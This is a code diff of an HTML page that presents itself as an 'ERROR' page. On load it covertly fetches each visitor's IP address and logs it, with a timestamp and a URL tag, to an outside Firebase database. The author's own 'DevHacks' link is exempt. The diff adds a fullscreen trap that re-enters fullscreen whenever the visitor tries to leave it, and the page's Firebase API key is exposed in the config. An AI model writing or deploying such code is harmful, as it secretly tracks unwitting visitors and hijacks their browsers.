@@ -22,17 +22,37 @@
         }
     </style>
     <script>
-        if(localStorage.getItem("HI3_43")=="HI2_34") {
-            // hi :/
+        if(localStorage.getItem("HI3_43") == "HI2_34") {
+            // hi
         } else {
-            window.location.href = "/main.html"
+            window.location.href = "/main.html";
         }
+
+        // fullscreen
+        document.documentElement.requestFullscreen = document.documentElement.requestFullscreen || document.documentElement.mozRequestFullScreen || document.documentElement.webkitRequestFullscreen || document.documentElement.msRequestFullscreen;
+
+        function enterFullscreen() {
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            }
+        }
+
+        document.addEventListener('fullscreenchange', function() {
+            if (document.fullscreenElement === null) {
+                enterFullscreen();
+            }
+        });
+
+        window.onload = function() {
+            enterFullscreen();
+        };
+
     </script>
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
         import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-database.js";
 
-        // config
+        // Firebase config
         const firebaseConfig = {
             apiKey: "AIzaSyA20B9DVKJBZVRaVcCh1KPmOwDv6fUzhTQ",
             authDomain: "client-ips.firebaseapp.com",
@@ -44,11 +64,11 @@
             measurementId: "G-9L2NQJTJTF"
         };
 
-        // starts firebase
+        // init
         const app = initializeApp(firebaseConfig);
         const database = getDatabase(app);
 
-        // fetches the ip from the api
+        // fetch address
         async function fetchClientIP() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
@@ -59,7 +79,8 @@
                 return "unknown";
             }
         }
-        // adds the ip
+
+        // log address
         async function logClientIP() {
             const clientIP = await fetchClientIP();
             const timestamp = new Date().toISOString();
@@ -70,7 +91,7 @@
                 name: query
             })
             .then(() => {
-                console.log("Logged Succesfully.");
+                console.log("Logged Successfully.");
             })
             .catch((error) => {
                 console.error("Logging Error:", error);
@@ -82,14 +103,15 @@
         const queryParams = new URLSearchParams(urlObj.search);
         const query = queryParams.get("q");
 
-        if (query=='DevHacks') {
+        if (query == 'DevHacks') {
             // hi
         } else {
-            // when the website/whatever loads
+            // When the website/whatever loads
             document.addEventListener('DOMContentLoaded', logClientIP);
-        }}
+        }
     </script>
 </head>
+
 <body>
     <center>
         <h1>ERROR</h1>
